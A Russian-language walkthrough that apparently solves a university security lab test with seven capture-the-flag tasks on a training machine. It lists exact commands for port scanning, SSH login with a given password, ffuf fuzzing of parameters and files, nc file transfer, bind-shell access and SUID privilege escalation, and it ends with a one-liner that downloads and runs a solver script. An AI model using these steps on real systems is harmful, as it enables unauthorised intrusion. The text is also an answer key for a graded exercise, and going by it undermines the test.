# BSI Test 1 — решение по шагам

Цель: 7 заданий, в каждом найти флаг `PJATK{...}` и вставить в форму на платформе.
`<HTTP_PORT>`, `<SSH_PORT>` и т.д. — номера портов из задания 1 (nmap).

---

## 0. VPN

```bash
sudo openvpn ~/Downloads/bsiws-20ca_-s32618.ovpn
```
В другой вкладке проверить, что туннель встал:
```bash
ip a show tun0
```
Есть адрес `10.65.x.x` → можно работать. VPN-вкладку не закрывать.
Параллельно включить машину на платформе.

---

## 1. Open ports

Один скан даёт все порты для остальных заданий.
```bash
nmap -Pn -sV -sC -T4 -p- 192.168.100.8
```
Выписать 4 порта из колонок SERVICE:
- `ssh` → задание 2
- `http` → задания 3, 4
- `gzip`/архив → задание 5
- `unknown` (молчит) → задание 6

Задание 1 засчитывается само после скана.

---

## 2. Search (SSH + haystack)

```bash
ssh student@192.168.100.8 -p <SSH_PORT>
```
Пароль: `pjatk`. Затем на машине:
```bash
grep -rao 'PJATK{[^}]*}' ~/haystack
```
Выйти: `exit`

---

## 3. Param Enumeration (параметр id)

Перебрать id 1–99, найти тот, что показывает флаг.
```bash
ffuf -w <(seq 1 99) -u 'http://192.168.100.8:<HTTP_PORT>/?id=FUZZ'
```
В выводе у одного id размер (Size) отличается от остальных. Открыть его в браузере:
```
http://192.168.100.8:<HTTP_PORT>/?id=<найденный_id>
```

---

## 4. File Enumeration (скрытый файл)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u 'http://192.168.100.8:<HTTP_PORT>/FUZZ'
```
Строка со `Status: 200` = имя файла. Открыть в браузере:
```
http://192.168.100.8:<HTTP_PORT>/<имя_файла>
```

---

## 5. File Transfer (tgz через nc)

```bash
nc 192.168.100.8 <TAR_PORT> > loot.tgz
tar xzf loot.tgz
grep -rao 'PJATK{[^}]*}' .
```

---

## 6. Bind Shell

```bash
nc 192.168.100.8 <SHELL_PORT>
```
Попадаешь в shell машины. Там:
```bash
cat ~/flag.txt
```

---

## 7. SUID Binary (owned by admin)

SUID-файл запускается с правами владельца (admin) → им можно прочитать флаг admin.
Две команды. Зайти по SSH (как в задании 2), затем:
```bash
find / -user admin -perm -4000 2>/dev/null
```
Команда напечатает путь, например `/usr/bin/backdoor`. Подставить **этот путь** и прочитать флаг:
```bash
/usr/bin/backdoor /home/admin/flag.txt
```

---

## Автоматом (скрипт делает всё то же самое)

```bash
curl -sL https://raw.githubusercontent.com/tohaidk/bsi-test1/main/solve_test1.py -o solve_test1.py && python3 solve_test1.py
```
В конце флаги в терминале и в файле `test1_flags.txt`.
